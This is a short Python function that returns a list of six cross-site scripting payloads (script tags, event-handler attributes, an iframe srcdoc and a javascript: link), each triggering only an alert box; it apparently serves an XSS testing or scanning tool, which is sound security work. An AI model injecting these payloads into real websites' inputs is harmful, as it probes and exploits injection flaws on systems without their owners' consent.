
def get_payloads():
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<body onload=alert('XSS')>",
        "<a href=javascript:alert('XSS')>click</a>"
    ]
